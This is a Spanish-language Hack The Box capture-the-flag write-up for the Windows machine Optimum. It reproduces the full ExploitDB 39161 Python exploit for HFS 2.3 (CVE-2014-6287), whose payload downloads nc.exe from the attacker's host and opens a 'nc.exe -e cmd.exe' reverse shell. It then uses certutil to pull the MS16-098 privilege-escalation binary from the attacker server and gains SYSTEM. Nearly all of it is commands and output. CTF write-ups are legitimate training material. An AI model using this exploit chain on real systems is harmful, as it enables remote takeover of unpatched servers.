
# Hack The Box: Optimum - Writeup
_by Fz3r0 💀_
_Keywords:_ `Hack The Box` `CTF` `Windows` `Optimum` `HFS` `HTTP File Server` `Searchsploit` `Reverse Shell` `PrivEsc` `conptyshell` `Windows Exploit Sugester` `ExploitDB` `certutil.exe`

## Datos de los objetos involucrados: 


- [⭕] Host Atactante IP (local):.................. 192.168.30.148

- [🔴] **LHOST** - Host Atactante IP (túnel):...... 10.10.14.5

- [🔵] **RHOST** - Host Víctima IP/Dominio.TLD:.... 10.10.10.8


## Resultados de Auditoría de Sistema Operativo: 


- [🔵] Reporte de auditoría a Víctima/RHOST:....... 10.10.10.8

- [🟢] Estado Actual de Víctima/RHOST:............. Host Activo

- [🔵] Sistema Operativo de Víctima/RHOST.......... Windows

- [🔵] Resultados basados en TTL:.................. 127

- [⚪] Fecha de Auditoría y Muestreo:.............. 2023-01-01 12:55:54

- [💀] Auditoría de Seguridad realizada por:....... Fz3r0 💀

## Resultados Preliminares de Auditoría de Puertos: 


- [🔴] Se encontraron <(( 1 ))> Puertos ABIERTOS en Víctima/RHOST:

    - [💀] -->> **` 80 `**


## Resultados Avanzados de Auditoría de Puertos & Servicios: 


- [🔴] Detalles de Servicios & Versiones en sockets de Víctima/RHOST: 

    - [💀] -->>  80/tcp open  http    HttpFileServer httpd 2.3


## Auditoría Preliminar de Vulnerabilidades en Víctima/RHOST: 


- [😔] -->>  No se han encontrado vulnerabilidades de manera automática, eso no quiere decir que no existan ;)


## Revisando Web http 80

- Es un servidor de archivos `http file server` mejor conocido como `HSF`

- **HFS 2.3** 

### Análisis profundo (Port Full Report)

```java
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web Scan

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ whatweb http://10.10.10.8 -v
WhatWeb report for http://10.10.10.8
Status    : 200 OK
Title     : HFS /
IP        : 10.10.10.8
Country   : RESERVED, ZZ

Summary   : Cookies[HFS_SID], HTTPServer[HFS 2.3], HttpFileServer, JQuery[1.4.4], Script[text/javascript]

Detected Plugins:
[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : HFS_SID

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : HFS 2.3 (from server string)

[ HttpFileServer ]
        You can use HFS (HTTP File Server) to send and receive 
        files. Access your remote files, over the network. 

        Google Dorks: (1)
        Website     : http://www.rejetto.com/hfs/

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse 
        HTML documents, handle events, perform animations, and add 
        AJAX. 

        Version      : 1.4.4
        Website     : http://jquery.com/

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 

        String       : text/javascript

HTTP Headers:
        HTTP/1.1 200 OK
        Content-Type: text/html
        Content-Length: 1659
        Accept-Ranges: bytes
        Server: HFS 2.3
        Set-Cookie: HFS_SID=0.431082866387442; path=/;
        Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
        Content-Encoding: gzip
```

## Exploit de `HFS 2.3`

- Viejo y confiable: `searchsploit HFS 2.3`

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ searchsploit HFS 2.3                                
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                        | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                        | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                             | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                     | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                           | windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- Hay varias RCE que posiblemente funcionen yo usé `9161`

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /home/fz3r0/Documents/01_-_Fz3r0_HTB/Optimum/39161.py


                                                                                                                                     
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ ls
00_Fz3r0_WriteUp-Optimum_HTB.md       39161.py                  Fz3r0_PortFullReport_Vuln.txt
01-Fz3r0_Psycho_Audit_Open_Ports.txt  Fz3r0_PortFullReport.txt  Fz3r0_PsychoMantis_v1.5.py
                                                                                                                                     
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ ls -lAh | grep 39161
-rwxr-xr-x 1 fz3r0 fz3r0 2.5K Jan  1 13:19 39161.py
                                                                                                                                     
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ 
```

### Script de Exploit

```py
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#              It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#              It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux.

#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
        def script_create():
                urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

        def execute_script():
                urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

        def nc_run():
                urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

        ip_addr = "192.168.44.128" #local IP address
        local_port = "443" # Local Port number
        vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
        save= "save|" + vbs
        vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
        exe= "exec|"+vbs2
        vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
        exe1= "exec|"+vbs3
        script_create()
        execute_script()
        nc_run()
except:
        print """[.]Something went wrong..!
        Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
        Don't forgot to change the Local IP address and Port number on the script"""                                                                                                                                     
```

- Solo hay que modificar las variables que necesitemos:

```py
ip_addr = "10.10.14.5" #local IP address
        local_port = "666" # Local Port number
```

- Cambio el nombre por `f0_hfs_exploit.py`

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ mv 39161.py f0_hfs_exploit.py
                                                                                                                                     
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ ls -lAh | grep hfs_ 
-rwxr-xr-x 1 fz3r0 fz3r0 2.4K Jan  1 13:24 f0_hfs_exploit.py <<<---- BOOOM!!!
```

## Cargando el Exploit al HFS

- Se deben realizar 3 cosas simultaneas:

1. Tener corriendo un servidor HTTP. (yo usaré python) Servir un `nc.exe`
2. Estar escuchando con un `netcat`
3. Cargar el archivo

- Así:

1. Escuchando con python http server:

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ python -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

2. Escuchar en el puerto `666` que puse en el exploit:

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ rlwrap nc -nlvp 666                 
listening on [any] 666 ...

```

3. Correr el exploit utilizando el puerto 80 del http server que desplegué (_OJO!!! Usa python2!!!_)

    - Automáticamente se nota actividad en el http server (se descargó el file)
    - Ejecutar nuevamente el exploit y da la segunda vuelva para enviar el reverse shell:

```sh
python2 f0_hfs_exploit.py $ip_target 80
```    

- Se recibe la shell con usuario sin privilegios de admin:

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ rlwrap nc -nlvp 666                 
listening on [any] 666 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.8] 49162
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas     <<<------- PWN!!! (user level)

C:\Users\kostas\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\kostas\Desktop>
```

### Búsqueda de flag user:

- Está en la ubicación de siempre... en el escritorio que llegué:

```bat
C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Desktop

08/01/2023  04:53 ��    <DIR>          .
08/01/2023  04:53 ��    <DIR>          ..
18/03/2017  02:11 ��           760.320 hfs.exe
08/01/2023  04:52 ��                34 user.txt
               2 File(s)        760.354 bytes
               2 Dir(s)   5.619.822.592 bytes free

C:\Users\kostas\Desktop>type user.txt
type user.txt
cc7236b9ab736cab544593b86d226f3d

C:\Users\kostas\Desktop>

```

## Comienza Post Exploit & PrivEsc

### Enum post-exploit

- Hago un poco de enumeración pa' ver que encuentro. 

```bat
C:\Users\kostas\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\kostas\Desktop>
```
- No hay privilegios como para usar Juicy Potato o Rotten Potato

- Reviso por más usuarios:

```bat
C:\Users\kostas\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ERROR: Unable to get user claims information.

C:\Users\kostas\Desktop>
```

- Después reviso directorios comunes con cosillas como escritorios, programas y users. Sin obtener mucho...

## Windows Exploit Sugester (También se puede usar WESNG [next gen])

- Tirar del `systeminfo`

- Copiar todo apartir de `Host Name` para crear un archivo de texto:

```bat
C:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          8/1/2023, 4:52:23 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.529 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.973 MB
Virtual Memory: In Use:    530 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Users\kostas\Desktop>
```

- Exporto lo copiado a un `systeminfo.txt`

- Primero armo el comando con `-u` para la descarga

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ python2 windows-exploit-suggester.py -u                                                                          
[*] initiating winsploit version 3.3...
[+] writing to file 2023-01-01-mssb.xls
[*] done
```
- Ingreso al comando el archivo que se descargó con -d
- Y con -i adjunto el archivo que se descargó
- Ojo, en caso que marque error el python2:

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py && python2 get-pip.py && python2 -m pip install --user xlrd==1.1.0
```

- Tirar comando `python2 windows-exploit-suggester.py -d 2023-01-01-mssb.xls -i systeminfo.txt`:

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ python2 windows-exploit-suggester.py -d 2023-01-01-mssb.xls -i systeminfo.txt   

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done

```

- TIP: los que tienen `E` es para escalar privilegios ;) | Es mejor tomar de arriba para abajo, así que yo tomé el primer "E" SIN EMBARGO ESTE NO FUNCIONÓ Y NO ESTARÁ DOCUMENTADO:

```java
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)  <----- intentaré este yo
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
```

- Debido a que no funcionó me fui con el siguiente: 

```java
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
```
- **Exploit: MS16-098 / ExploitDB ID = 41020**

## Buscando el exploit

- Tip para buscar exploits en exploit DB

    - Buscar por la carpeta de bin-exploits con identificadores de ExploitDB: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main/bin-sploits
    - `https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/` agregar al final el nombre del exploit y la extensión o simplemente utilizar buscador de ID

- Resultado: `/bin-sploits/` + `41020.exe` = EZ exploit!

- https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/41020.exe
- https://www.exploit-db.com/exploits/41020

    - Al final descargo el `.exe` a mi máquina, hora de cargarlo a la víctima.

## Cargando y ejecutando exploit en Víctima `certutil.exe`

- Para no dejar huella me voy a C:\Windows\Temp>
- Ahí creo una carpeta donde descargaré mi .exe

```bat
C:\Windows\Temp>mkdir PrivEsc
mkdir PrivEsc

C:\Windows\Temp>cd PrivEsc
cd PrivEsc

C:\Windows\Temp\PrivEsc>
```

- Recordar que tengo un server Python por puerto 80... pero como la máquina ya tiene una Web en purto 80 cambiaré el server al 8000:

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Optimum]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Usando `certutil.exe`

- Sintaxis de descarga:

```bat
certutil.exe -f -urlcache -split http://10.10.14.5:8000/41020.exe
```

- Descarga exitosa:

```bat
C:\Windows\Temp\PrivEsc>certutil.exe -f -urlcache -split http://10.10.14.5:8000/41020.exe
certutil.exe -f -urlcache -split http://10.10.14.5:8000/41020.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\PrivEsc>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Windows\Temp\PrivEsc

08/01/2023  07:14 ��    <DIR>          .
08/01/2023  07:14 ��    <DIR>          ..
08/01/2023  07:04 ��            82.239 41015.exe    <<<------ Este no me sirvió, pero es posible lo haya cargado mal :P 
08/01/2023  07:14 ��           560.128 41020.exe    <<<------ Escploit que funcionó
08/01/2023  07:04 ��            82.239 Blob0_0.key
               3 File(s)        724.606 bytes
               2 Dir(s)   5.617.573.888 bytes free

C:\Windows\Temp\PrivEsc>

```

### Exploit!!!

- Solo es necesario ejecutar el `.exe`

```bat
C:\Windows\Temp\PrivEsc>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\Temp\PrivEsc>whoami
whoami
nt authority\system          <<<<------------------- PWNd!!! PrivEsc done

C:\Windows\Temp\PrivEsc>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

